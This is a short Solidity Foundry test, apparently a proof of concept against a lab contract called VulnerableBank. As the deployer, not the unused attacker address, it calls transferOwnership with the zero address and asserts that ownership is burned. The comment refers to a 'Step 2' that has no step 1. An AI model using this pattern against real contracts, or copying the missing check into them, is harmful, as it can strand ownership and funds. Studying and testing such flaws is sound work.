// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
import "./basetest.sol";
import "../src/VulnerableBank.sol";

contract PocTest is BaseTestWithBalanceLog {
    VulnerableBank target;
    address attacker = address(0xBAD);

    function setUp() public {
        target = new VulnerableBank();
        vm.deal(attacker, 10 ether);
    }

    function testExploit() public balanceLog {
        // Step 2: Call the `transferOwnership` function with address(0) as the new owner.
        vm.prank(address(this));
        target.transferOwnership(address(0));

        // Prove that ownership is transferred to address(0)
        assertEq(target.owner(), address(0));
    }
}